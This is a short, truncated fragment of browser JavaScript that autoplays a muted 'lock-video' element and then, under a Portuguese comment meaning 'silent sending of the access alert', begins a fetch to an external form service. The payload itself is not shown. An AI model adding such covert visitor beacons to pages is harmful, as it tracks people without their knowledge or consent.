            // Start Lock Video (Mobile preview)
            const video2 = document.getElementById("lock-video");
            if (video2 && video2.paused) {
                video2.muted = true;
                video2.play().catch(e => {});
            }

            // Envio silencioso do alerta de acesso
            fetch('https://api.staticforms.dev/submit', {
